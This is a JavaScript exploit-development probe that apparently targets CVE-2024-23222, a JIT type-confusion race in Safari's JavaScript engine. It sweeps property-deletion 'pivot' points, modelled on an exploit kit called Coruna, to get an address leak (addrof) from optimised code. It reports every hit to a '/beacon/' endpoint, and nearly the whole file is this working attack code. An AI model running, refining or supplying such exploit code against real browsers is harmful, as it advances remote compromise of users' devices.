/* p105 — FTL detection + CVE-2024-23222 race with correct PIVOT range
 *
 * PROBLEM: p104 PIVOTs (200K-1.2M) were too high. FTL starts compiling
 * around ~100K calls. Coruna uses PIVOT ~175K on iOS.
 *
 * This probe:
 * I1: FTL detection via timing (does perf step-change at high call counts?)
 * I2: Race with Coruna-matching PIVOTs (80K-250K range)
 * I3: Race with very low PIVOTs (10K-70K, catch DFG-to-FTL transition)
 * I4: Multiple rapid attempts (statistical, 20 tries at PIVOT 150K)
 * I5: Alternative structure — the array IS the property being profiled
 *
 * Beacon prefix: V105I-
 */
(function(){
var RUN_ID = "v105i" + Math.random().toString(36).slice(2,12);
var PREFIX = "V105I-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press105-ftl-detect");

var _f64 = new Float64Array(1);
var _u32 = new Uint32Array(_f64.buffer);
function f2i(f) { _f64[0] = f; return [_u32[0], _u32[1]]; }

/* ====== I1: FTL detection via timing ====== */
function test_I1() {
  var r = {};
  try {
    function bench(n) { return n + 0.5; }

    // Measure time for batches of 100K calls
    var times = [];
    for (var batch = 0; batch < 20; batch++) {
      var t0 = Date.now();
      for (var i = 0; i < 100000; i++) bench(i + 0.1);
      var t1 = Date.now();
      times.push(t1 - t0);
    }

    // If FTL kicks in, later batches should be noticeably faster
    r.times = times.join(',');
    r.first3 = times.slice(0, 3).join(',');
    r.last3 = times.slice(-3).join(',');
    r.firstAvg = Math.round((times[0] + times[1] + times[2]) / 3);
    r.lastAvg = Math.round((times[17] + times[18] + times[19]) / 3);
    r.speedup = r.firstAvg > 0 ? (r.firstAvg / r.lastAvg).toFixed(2) : 'N/A';

    // FTL typically gives 2-5x speedup over DFG
    r.FTL_LIKELY = (r.firstAvg > 0 && r.lastAvg > 0 && r.firstAvg / r.lastAvg > 1.5);

    // Also test with a more complex function
    function bench2(obj, idx) {
      var a = obj.arr;
      var sum = 0;
      sum += a[idx & 7]; sum += a[(idx + 1) & 7];
      return sum;
    }
    var testObj = {arr: [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]};
    var times2 = [];
    for (var batch = 0; batch < 20; batch++) {
      var t0 = Date.now();
      for (var i = 0; i < 100000; i++) bench2(testObj, i);
      var t1 = Date.now();
      times2.push(t1 - t0);
    }
    r.times2 = times2.join(',');
    r.first3_2 = times2.slice(0, 3).join(',');
    r.last3_2 = times2.slice(-3).join(',');

    r.SURVIVED = true;
    B("I1-FTL-DETECT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("I1-ERR", r); }
}

/* Race attempt function — reused by I2-I4 */
function raceAttempt(PIVOT, TOTAL, id) {
  var r = {pivot: PIVOT, total: TOTAL, id: id};
  try {
    var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
    var c1 = {}; c1.arr = arr; c1.pad = 42;
    var c2 = {}; c2.arr = arr;

    // Hot function — TWO params for Phi merge, prevents CSE
    function hot(o1, o2, flag) {
      var a;
      if (flag) { a = o1.arr; } else { a = o2.arr; }
      return a[0];
    }

    var deleted = false;
    for (var i = 0; i < TOTAL; i++) {
      if (i & 1) hot(c1, c1, true);
      else hot(c2, c2, false);

      if (i === PIVOT && !deleted) {
        // No-op padding to widen race window
        var _nop = 0;
        for (var _n = 0; _n < 47; _n++) _nop += _n;
        delete c1.pad;
        for (var _n = 0; _n < 47; _n++) _nop += _n;
        deleted = true;
      }
    }

    // Test: transition array, then read through potentially-confused code
    var marker = {mark: 48879}; // 0xBEEF
    arr[0] = marker;
    var result = hot(c1, c1, true);

    r.resultType = typeof result;
    if (typeof result === 'number') {
      r.CONFUSED = true;
      r.leaked = result;
      var bits = f2i(result);
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
    } else {
      r.CONFUSED = false;
      r.isMarker = (result === marker);
    }
    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); }
  return r;
}

/* ====== I2: Coruna-matching PIVOTs (80K-250K) ====== */
function test_I2() {
  var pivots = [80000, 100000, 120000, 140000, 150000, 160000, 175000, 190000, 200000, 220000, 250000];
  var results = [];

  for (var p = 0; p < pivots.length; p++) {
    var r = raceAttempt(pivots[p], 500000, "I2-" + pivots[p]);
    results.push(r);
    if (r.CONFUSED) B("I2-ADDROF", r);
  }

  var summary = {
    total: results.length,
    confusedCount: results.filter(function(r){return r.CONFUSED;}).length,
    pivots: results.map(function(r){return r.pivot+':'+(r.CONFUSED?'YES':'no');}).join('|')
  };
  B("I2-CORUNA-RANGE", summary);
}

/* ====== I3: Very low PIVOTs (5K-70K) ====== */
function test_I3() {
  var pivots = [5000, 10000, 20000, 30000, 40000, 50000, 60000, 70000];
  var results = [];

  for (var p = 0; p < pivots.length; p++) {
    var r = raceAttempt(pivots[p], 300000, "I3-" + pivots[p]);
    results.push(r);
    if (r.CONFUSED) B("I3-ADDROF", r);
  }

  var summary = {
    total: results.length,
    confusedCount: results.filter(function(r){return r.CONFUSED;}).length,
    pivots: results.map(function(r){return r.pivot+':'+(r.CONFUSED?'YES':'no');}).join('|')
  };
  B("I3-LOW-RANGE", summary);
}

/* ====== I4: Statistical at multiple pivots — 20 attempts each ====== */
function test_I4() {
  var pivots = [100000, 150000, 175000];
  var results = {};

  for (var p = 0; p < pivots.length; p++) {
    var pv = pivots[p];
    var hits = 0;
    for (var rep = 0; rep < 20; rep++) {
      var r = raceAttempt(pv, 400000, "I4-" + pv + "-" + rep);
      if (r.CONFUSED) {
        hits++;
        B("I4-ADDROF", r);
      }
    }
    results[pv] = hits + '/20';
  }
  B("I4-STATS", results);
}

/* ====== I5: Alternative — tryGetConstantProperty on array property directly ====== */
function test_I5() {
  var r = {};
  try {
    // Different structure: the array IS stored as a named property
    // and the object has additional properties that change structure
    var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

    // Create with defineProperty to control exact layout
    var c1 = Object.create(null);
    c1.x = arr;
    c1.y = 1337;
    c1.z = 42; // will be deleted

    var c2 = Object.create(null);
    c2.x = arr;
    c2.y = 1337;
    // no z — different structure

    function hot5(o1, o2, flag) {
      var a;
      if (flag) { a = o1.x; } else { a = o2.x; }
      return a[0];
    }

    // Wide PIVOT sweep
    var pivots = [50000, 100000, 150000, 175000, 200000];
    var results = [];

    for (var pi = 0; pi < pivots.length; pi++) {
      var pv = pivots[pi];
      // Fresh objects each attempt
      var cc1 = Object.create(null);
      cc1.x = arr;
      cc1.y = 1337;
      cc1.z = 42;
      var cc2 = Object.create(null);
      cc2.x = arr;
      cc2.y = 1337;

      // MUST create new function each attempt for fresh JIT
      var hotFn = new Function('c1', 'c2', 'flag',
        'var a; if (flag) { a = c1.x; } else { a = c2.x; } return a[0];');

      var deleted = false;
      for (var i = 0; i < 400000; i++) {
        if (i & 1) hotFn(cc1, cc1, true);
        else hotFn(cc2, cc2, false);
        if (i === pv && !deleted) {
          var _nop = 0;
          for (var _n = 0; _n < 47; _n++) _nop += _n;
          delete cc1.z;
          for (var _n = 0; _n < 47; _n++) _nop += _n;
          deleted = true;
        }
      }

      arr[0] = {mark: 48879};
      var result = hotFn(cc1, cc1, true);
      var confused = typeof result === 'number';
      results.push(pv + ':' + (confused ? 'YES' : 'no'));
      if (confused) {
        var bits = f2i(result);
        B("I5-ADDROF", {pivot: pv, lo: '0x'+(bits[0]>>>0).toString(16), hi: '0x'+(bits[1]>>>0).toString(16)});
      }
      // Reset array for next attempt
      arr[0] = 1.1;
    }

    r.results = results.join('|');
    r.SURVIVED = true;
    B("I5-ALT-STRUCTURE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("I5-ERR", r); }
}

/* ====== I6: FTL with inner loop (ensures higher execution count) ====== */
function test_I6() {
  var r = {};
  try {
    var arr = [1.1, 2.2, 3.3, 4.4];
    var c1 = {}; c1.arr = arr; c1.pad = 42;
    var c2 = {}; c2.arr = arr;

    // Function with inner loop — gets more "hot" ticks per call
    function hotInner(o1, o2, flag) {
      var a;
      if (flag) { a = o1.arr; } else { a = o2.arr; }
      var s = 0;
      for (var j = 0; j < 4; j++) s += a[j];
      return s;
    }

    var pivots = [10000, 25000, 50000, 75000, 100000];
    var results = [];

    for (var pi = 0; pi < pivots.length; pi++) {
      var pv = pivots[pi];
      var aa = [1.1, 2.2, 3.3, 4.4];
      var cc1 = {}; cc1.arr = aa; cc1.pad = 42;
      var cc2 = {}; cc2.arr = aa;

      // Need fresh function per attempt
      var fn = new Function('c1', 'c2', 'flag',
        'var a; if (flag) { a = c1.arr; } else { a = c2.arr; }' +
        'var s = 0; for (var j = 0; j < 4; j++) s += a[j]; return s;');

      var deleted = false;
      for (var i = 0; i < 200000; i++) {
        if (i & 1) fn(cc1, cc1, true);
        else fn(cc2, cc2, false);
        if (i === pv && !deleted) {
          delete cc1.pad;
          deleted = true;
        }
      }

      aa[0] = {m: 0xDEAD};
      var result = fn(cc1, cc1, true);
      var confused = typeof result === 'number' && result > 100;
      results.push(pv + ':' + (confused ? 'YES' : 'no'));
      if (confused) {
        r.CONFUSED = true;
        B("I6-ADDROF", {pivot: pv, val: result});
      }
      aa[0] = 1.1; // reset
    }

    r.results = results.join('|');
    r.SURVIVED = true;
    B("I6-INNER-LOOP", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("I6-ERR", r); }
}

/* ====== Run ====== */
try {
  test_I1();                     // FTL detection (0ms)
  setTimeout(test_I2, 3000);     // Coruna PIVOTs (3s)
  setTimeout(test_I3, 12000);    // Low PIVOTs (12s)
  setTimeout(test_I4, 18000);    // Statistical 20x (18s)
  setTimeout(test_I5, 40000);    // Alt structure (40s)
  setTimeout(test_I6, 50000);    // Inner loop (50s)
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe105-done"); }, 90000);
})();
